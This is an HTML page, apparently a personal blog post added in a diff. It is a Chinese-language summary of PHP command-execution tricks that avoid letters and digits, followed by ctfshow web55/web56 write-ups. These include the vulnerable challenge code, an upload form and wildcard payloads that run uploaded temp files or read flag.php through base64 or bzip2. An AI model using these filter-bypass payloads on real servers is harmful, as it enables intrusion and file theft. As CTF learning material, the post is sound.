@@ -1,0 +1,298 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>无字母数字RCE的一些总结 - xiaofeiji&#39;s Blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Xiaofeiji,"> 
+    <meta name="description" content="前提在没有数字字母的前提下，要生成我们需要的字符，可以通过以下几种运算得到。
+异或（^）数字相同异或为0，不相同为1.
+0^1=1
+0^0=0
+1^1=0
+任何字母与0异或，最后的结果是字母本身。
+,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="xiaofeiji&#39;s Blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.jpg"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+   </script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="loading">
+    <span id="config-title" style="display:none">xiaofeiji&#39;s Blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">无字母数字RCE的一些总结</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">无字母数字RCE的一些总结</h1>
+        <div class="stuff">
+            <span>八月 22, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/" rel="tag">无字母数字rce</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><p>在没有数字字母的前提下，要生成我们需要的字符，可以通过以下几种运算得到。</p>
+<h3 id="异或（-）"><a href="#异或（-）" class="headerlink" title="异或（^）"></a>异或（^）</h3><p>数字相同异或为0，不相同为1.</p>
+<p>0^1=1</p>
+<p>0^0=0</p>
+<p>1^1=0</p>
+<p>任何字母与0异或，最后的结果是字母本身。</p>
+<ul>
+<li>原理剖析:</li>
+</ul>
+<p>( ^ @ is h</p>
+<p>首先我们来计算(的ascii码为40，那么@的ascii码为64，如果互相异或的话那么就是h的ascii码，在php中有一个特性，那么就是可以对字符进行相互异或，异或出来的结果也就是我们要实现命令执行的关键字符了。</p>
+<p><img src="1.png"></p>
+<h3 id="按位与运算（-amp-）和按位或运算（-）的计算方法"><a href="#按位与运算（-amp-）和按位或运算（-）的计算方法" class="headerlink" title="按位与运算（&amp;）和按位或运算（|）的计算方法"></a>按位与运算（&amp;）和按位或运算（|）的计算方法</h3><p>参与运算的两个数转化为二进制后，当相应为上全为1时取1，存在0时取0。</p>
+<p>110 | 101    111</p>
+<p>110 &amp; 101    111</p>
+<h4 id="按位同或（⊙）"><a href="#按位同或（⊙）" class="headerlink" title="按位同或（⊙）"></a>按位同或（<strong>⊙</strong>）</h4><p>参与运算的两个数转化为二进制后，当相对应位置上数字相同时取1，不相同取0。</p>
+<p>0^1=0</p>
+<p>0^0=1</p>
+<p>1^1=1</p>
+<h3 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h3><p>10010111</p>
+<p>01101000</p>
+<p>利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如 <strong>‘和’{1</strong>}的结果是”\x92”，其取反即为字母m:</p>
+<p>PHP5下不能直接 echo ~’和’{1}，这是PHP7下的语法</p>
+<p>所以有，echo ~（”\x92”）;的结果就是m。</p>
+<p><img src="2.png"></p>
+<p>这样就由汉字得到了字母。</p>
+<h3 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h3><p>递减NULL值没有效果，递增NULL的结果是1</p>
+<p><img src="3.png"></p>
+<p><img src="4.png"></p>
+<p><img src="5.png"></p>
+<p><img src="6.png"></p>
+<p>自增的使用不太理解，就先记录下来了。</p>
+<h3 id="新姿势"><a href="#新姿势" class="headerlink" title="新姿势"></a>新姿势</h3><p><strong>除了按位运算和自增运算，还有一个绕过无数字字母的做法，就是使用.命令构造结合shell命令执行：</strong></p>
+<ol>
+<li>shell下可以利用.来执行任意脚本</li>
+<li>Linux文件名支持用glob通配符代替</li>
+</ol>
+<p>用. file执行文件，是不需要file有x权限的。因此只要目标机上存在我们可以操控的文件就可以了。</p>
+<p>我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母。</p>
+<p>使用通配符绕过的话，/tmp/phpXXXXXX就可以表示为/*/?????????或/???/?????????</p>
+<p>[@-[]是匹配linux系统中所有的大写字母</p>
+<p>Unix/Linux上常见的Shell脚本解释器有bash、sh、csh、ksh等，习惯上把它们称作一种Shell。我们常说有多少种Shell，其实说的是Shell脚本解释器。</p>
+<ul>
+<li>执行命令的构造是：</li>
+</ul>
+<p><strong>#! /bin/sh ls</strong></p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p>p神：（具体的理解可以参考p神的文章，好强的师傅）</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
+<p>其他参照：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/m0re/p/14269964.html">https://www.cnblogs.com/m0re/p/14269964.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_28944067/article/details/113381102">ctf xor题_一道使用异或来命令执行的CTF题目_Emma mkq的博客-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43345204/article/details/92794251">https://blog.csdn.net/qq_43345204/article/details/92794251</a></p>
+<h3 id="ctfshow-命令执行web55（利用新姿势解题）"><a href="#ctfshow-命令执行web55（利用新姿势解题）" class="headerlink" title="ctfshow 命令执行web55（利用新姿势解题）"></a>ctfshow 命令执行web55（利用新姿势解题）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line"></span><br><span class="line">​    system(<span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>过滤了字母，没有办法直接使用命令执行了。会想到无数字字母webshell这个内容，跟红包题的第二弹类似考点。</p>
+<p><strong>在linux shell中，.可以用当前的shell执行一个文件中的命令，比如.file就是执行file文件中的命令。所以本题可以post上传一个包含命令的文件，然后通过.来执行文件中的命令即可读到flag。</strong></p>
+<h4 id="分析解题"><a href="#分析解题" class="headerlink" title="分析解题"></a>分析解题</h4><p>用/???/?????????匹配到的其他文件都是小写字母，只有php临时生成的文件才包含大写字母，不过因为是随机生成的大写字母，不一定每次都是大写，上传时可以多试几下。</p>
+<ul>
+<li>因此通过对大写字母的匹配，多次发包寻找，.执行命令，应该就能找到文件。</li>
+</ul>
+<p>注意：通过.去执行sh命令不需要有执行权限</p>
+<p>ASCII码表中可见大写字母位于@与[之间：所以可以使用[@-[]来表示大写字母：</p>
+<p><strong>?c=.+/???/????????[@-[]</strong></p>
+<ol>
+<li>先构造发送一个post数据包：</li>
+</ol>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">​    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line"></span><br><span class="line">​    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"></span><br><span class="line">​    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">​    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<ol start="2">
+<li>抓包构造命令执行，通过条件竞争，多次发包访问：</li>
+</ol>
+<p><img src="7.png"></p>
+<p>直接获取flag。</p>
+<p><img src="8.png"></p>
+<p><strong>参考文章：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a></p>
+<h4 id="解题新思路（过滤字母，保留数字时）"><a href="#解题新思路（过滤字母，保留数字时）" class="headerlink" title="解题新思路（过滤字母，保留数字时）"></a>解题新思路（过滤字母，保留数字时）</h4><p>或者可以使用另一种绕过的新姿势：</p>
+<p>代码当中没有过滤数字，所以可以找一个存在数字的查看文件的命令：</p>
+<ul>
+<li><strong>base64的使用</strong></li>
+</ul>
+<p>我们就可以通过通配符进行匹配命令执行查看flag.php</p>
+<p><strong>payload：?c=/???/????64 ????.???</strong></p>
+<p>意思是 /bin/base64 flag.php</p>
+<ul>
+<li><strong>bzip2的使用</strong></li>
+</ul>
+<p>bzip2是linux下面的压缩文件的命令</p>
+<p>我们可以通过该命令压缩flag.php 然后进行下载</p>
+<p><strong>payload：?c=/???/???/????2 ????.???</strong></p>
+<p>也就是/usr/bin/bzip2 flag.php</p>
+<p>然后访问/flag.php.bz2进行下载获得flag.php</p>
+<p>（原文链接）<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/article/details/108555433">https://blog.csdn.net/qq_46091464/article/details/108555433</a></p>
+<ul>
+<li>这里使用base64进行尝试：</li>
+</ul>
+<p>?c=/???/????64 ????.???</p>
+<p>然后进行base64解码即可。（两种方法都可以的）</p>
+<p><img src="9.png"></p>
+<p><img src="10.png"></p>
+<h4 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h4><p>过滤了数字和字母，无数字字母webshell.</p>
+<p>按照web55提到的post发包方式，构造sh命令，通过.命令读取文件。</p>
+<h3 id="ctfshow红包题第二弹"><a href="#ctfshow红包题第二弹" class="headerlink" title="ctfshow红包题第二弹"></a>ctfshow红包题第二弹</h3><p>博客地址：</p>
+<p><a target="_blank" rel="noopener" href="https://xiaofeiji-77.github.io/2021/08/15/ctfshow%E7%BA%A2%E5%8C%85%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%BC%B9/">https://xiaofeiji-77.github.io/2021/08/15/ctfshow%E7%BA%A2%E5%8C%85%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%BC%B9/</a></p>
+<h3 id="ctfshow命令执行web41（或运算）"><a href="#ctfshow命令执行web41（或运算）" class="headerlink" title="ctfshow命令执行web41（或运算）"></a>ctfshow命令执行web41（或运算）</h3><p>博客地址：</p>
+<p><a target="_blank" rel="noopener" href="https://xiaofeiji-77.github.io/2021/08/22/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87/#web41%EF%BC%88%E6%88%96%E8%BF%90%E7%AE%97-%E4%BD%BF%E7%94%A8%E8%84%9A%E6%9C%AC%E8%A7%A3%E9%A2%98%EF%BC%89">https://xiaofeiji-77.github.io/2021/08/22/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87/#web41%EF%BC%88%E6%88%96%E8%BF%90%E7%AE%97-%E4%BD%BF%E7%94%A8%E8%84%9A%E6%9C%AC%E8%A7%A3%E9%A2%98%EF%BC%89</a></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable=''
+        data-ae=''
+        data-ci=''
+        data-cs=''
+        data-r='xiaofeiji-77.github.io'
+        data-o='xiaofeiji-77'
+        data-a='xiaofeiji-77'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E6%8F%90"><span class="toc-number">1.</span> <span class="toc-text">前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%82%E6%88%96%EF%BC%88-%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">异或（^）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%89%E4%BD%8D%E4%B8%8E%E8%BF%90%E7%AE%97%EF%BC%88-amp-%EF%BC%89%E5%92%8C%E6%8C%89%E4%BD%8D%E6%88%96%E8%BF%90%E7%AE%97%EF%BC%88-%EF%BC%89%E7%9A%84%E8%AE%A1%E7%AE%97%E6%96%B9%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">按位与运算（&amp;）和按位或运算（|）的计算方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%89%E4%BD%8D%E5%90%8C%E6%88%96%EF%BC%88%E2%8A%99%EF%BC%89"><span class="toc-number">3.1.</span> <span class="toc-text">按位同或（⊙）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%96%E5%8F%8D"><span class="toc-number">4.</span> <span class="toc-text">取反</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%A2%9E"><span class="toc-number">5.</span> <span class="toc-text">自增</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B0%E5%A7%BF%E5%8A%BF"><span class="toc-number">6.</span> <span class="toc-text">新姿势</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">7.</span> <span class="toc-text">参考文章</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb55%EF%BC%88%E5%88%A9%E7%94%A8%E6%96%B0%E5%A7%BF%E5%8A%BF%E8%A7%A3%E9%A2%98%EF%BC%89"><span class="toc-number">8.</span> <span class="toc-text">ctfshow 命令执行web55（利用新姿势解题）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E8%A7%A3%E9%A2%98"><span class="toc-number">8.1.</span> <span class="toc-text">分析解题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%96%B0%E6%80%9D%E8%B7%AF%EF%BC%88%E8%BF%87%E6%BB%A4%E5%AD%97%E6%AF%8D%EF%BC%8C%E4%BF%9D%E7%95%99%E6%95%B0%E5%AD%97%E6%97%B6%EF%BC%89"><span class="toc-number">8.2.</span> <span class="toc-text">解题新思路（过滤字母，保留数字时）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web56"><span class="toc-number">8.3.</span> <span class="toc-text">web56</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ctfshow%E7%BA%A2%E5%8C%85%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%BC%B9"><span class="toc-number">9.</span> <span class="toc-text">ctfshow红包题第二弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb41%EF%BC%88%E6%88%96%E8%BF%90%E7%AE%97%EF%BC%89"><span class="toc-number">10.</span> <span class="toc-text">ctfshow命令执行web41（或运算）</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+   
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/click_show_text.js"></script>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/canvas-nest.min.js"></script>
+</html>
